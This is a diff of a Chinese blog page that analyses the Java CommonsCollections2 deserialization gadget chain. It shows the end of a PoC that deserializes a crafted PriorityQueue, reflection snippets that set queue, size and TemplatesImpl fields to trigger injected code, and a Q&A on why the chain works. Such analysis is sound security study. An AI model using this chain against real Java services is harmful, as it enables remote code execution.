+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">oss</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>可能大家还有以下的一些疑问：</p>
+<ul>
+<li>为什么yso里面用的add方法？</li>
+</ul>
+<p>这里上面已经讲过，add跟offer方法是一样的，只是方法名称命名的区别</p>
+<ul>
+<li>为什么别人的都是add两次或者这样写new PriorityQueue(2,transformingComparator);？</li>
+</ul>
+<p>add两次是因为要把size增加为2，这样就可以走到siftDown方法当中，我们直接复制给size是一样的道理。</p>
+<p>至于new PriorityQueue(2,transformingComparator);这样写也是一样的，因为在构造方法的时候就是把这2赋值给queue数组，然后queue数组就会便利增加size：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="k">this</span><span class="o">.</span><span class="na">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">initialCapacity</span><span class="o">]</span>
+</span></span></code></pre></div><p>除此之外还可以用反射的方式对queue数组进行赋值，就不需要用到add或者offer了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="s">&#34;queue&#34;</span><span class="o">,</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">obj</span><span class="o">,</span><span class="n">obj</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;size&#34;</span><span class="o">,</span> <span class="n">2</span><span class="o">);</span>
+</span></span></code></pre></div><ul>
+<li>为什么InvokerTransformer方法不直接设置newTransformer方法呢？</li>
+</ul>
+<p>因为没有了ConstantTransformer对象，那么就会直接调用到它本身的对象方法，它本身是没有newTransformer方法的，所以直接调用会报错，到后面序列化的时候再把iMethodName赋值就可以了。</p>
+<h2 id="0x03-总结">0x03 总结</h2>
+<p>分析cc2的时候看了很多大佬的文章，大多部分只是渐渐的看poc然后去分析，没有真正了解到这是为什么那又是为什么，总是为了完成写文章而写。</p>
+<p>独立思考确实很重要， 比如我上面完全就不按官方那样写，照样也可以触发我们的恶意代码。又比如上面的writeObject重写那里，我翻遍了很多文章都没说到queue数组的问题，而且这个也是一个不可序列化的。</p>
+<p>在分析TemplatesImpl终于有看到一遍文章写到下面这句是可有可无的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+</span></span></code></pre></div><p>因为在TemplatesImpl进行反序列化的时候会创建TransformerFactoryImpl对象给_tfactory变量，而且在序列化的是没有用到newTransformer方法是不会触发报错的。</p>
+<h2 id="0x04-参考">0x04 参考</h2>
+<p>《Java安全漫谈 - 16.commons-collections4与漏洞修复》</p>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">https://www.cnblogs.com/nice0e3/p/13860621.html</a></p>
 
 
             <hr class="bg-gray-300 mt-8">
@@ -225,15 +622,15 @@
 <div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
     <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
     
-    <li><a href="/commonscollections1_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsCollections1链分析</a></li>
+    <li><a href="/commonscollections3_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsCollections3链分析</a></li>
     
-    <li><a href="/install-parallels-tools-on-kali-linux-2022.2.html" class="underline text-yellow-600">Kali Linux 2022.2安装Parallels Tools</a></li>
+    <li><a href="/commonscollections6_chain_analysis.html" class="underline text-yellow-600">Java代码审计-CommonsCollections6链分析</a></li>
     
-    <li><a href="/urldns_chain_analysis.html" class="underline text-yellow-600">Java代码审计-URLDNS链分析</a></li>
+    <li><a href="/install-parallels-tools-on-kali-linux-2023.3.html" class="underline text-yellow-600">Kali Linux 2023.3安装Parallels Tools</a></li>
     
-    <li><a href="/python_separation_to_antivirus.html" class="underline text-yellow-600">免杀技术- Python分离免杀</a></li>
+    <li><a href="/when_the_cve-2022-35914_vulnerability_encounters_the_disable_function.html" class="underline text-yellow-600">当CVE-2022-35914漏洞遇到disable function</a></li>
     
-    <li><a href="/sdl.html" class="underline text-yellow-600">SDL(安全开发生命周期)</a></li>
+    <li><a href="/develop_awvs_api_tools_using_go_language.html" class="underline text-yellow-600">使用GO语言开发AWVS API工具</a></li>
     
 </div>
 
@@ -356,7 +753,10 @@
             <li><a href="#环境准备">环境准备</a></li>
           </ul>
         </li>
-        <li><a href="#0x00">0x00</a></li>
+        <li><a href="#0x01-分析过程">0x01 分析过程</a></li>
+        <li><a href="#0x02-使用templatesimpl改进">0x02 使用TemplatesImpl改进</a></li>
+        <li><a href="#0x03-总结">0x03 总结</a></li>
+        <li><a href="#0x04-参考">0x04 参考</a></li>
       </ul>
     </li>
   </ul>
